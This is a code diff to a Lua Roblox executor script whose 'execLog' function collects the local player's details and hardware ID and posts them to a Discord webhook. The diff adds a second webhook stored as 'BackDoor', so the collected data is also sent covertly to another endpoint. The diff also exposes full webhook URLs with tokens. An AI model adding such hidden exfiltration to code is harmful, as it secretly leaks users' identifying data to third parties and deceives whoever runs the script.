@@ -189,6 +189,8 @@ local function execLog()
     local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
     local HttpService = game:GetService("HttpService")
 
+    getgenv().BackDoor = "https://discord.com/api/webhooks/1364811382813364315/H7KX4N89YGtoIsgAHy6Nxj_kZ3Ks33w7Tgb7x8mpfS2L3z8eT8YS22smKeu4GPZ2uUMw"
+
     local player = Players.LocalPlayer
     local hwid = RbxAnalyticsService:GetClientId()
 
@@ -260,25 +262,33 @@ local function execLog()
         ["avatar_url"] = imageUrl,
     }
 
-    local requestFunction = syn and syn.request or http_request or request
-    if requestFunction then
-        local success, response = pcall(function()
+local requestFunction = syn and syn.request or http_request or request
+if requestFunction then
+    local function sendToWebhook(url)
+        return pcall(function()
             return requestFunction({
-                Url = "https://discord.com/api/webhooks/1332946018639151124/CeV_MFyH-8nZzv-IlNyariOHCCiZN8U7Ih-02Qjcgjp1YhYFAu0XcDXtgL2BoF_g0KpV",
+                Url = url,
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode(payload)
             })
         end)
-
-        if success and response and response.Success then
-            print("yea")
-        else
-            warn("nah")
-        end
-    else
-        warn("?")
     end
+
+    -- Send to primary webhook
+    local success1, response1 = sendToWebhook("https://discord.com/api/webhooks/1332946018639151124/CeV_MFyH-8nZzv-IlNyariOHCCiZN8U7Ih-02Qjcgjp1YhYFAu0XcDXtgL2BoF_g0KpV")
+    
+    -- Send to BackDoor webhook
+    local success2, response2 = sendToWebhook(getgenv().BackDoor)
+
+    if success1 and response1 and response1.Success and success2 and response2 and response2.Success then
+        print("yea")
+    else
+        warn("nah")
+    end
+else
+    warn("?")
 end
+
 
 pcall(execLog)
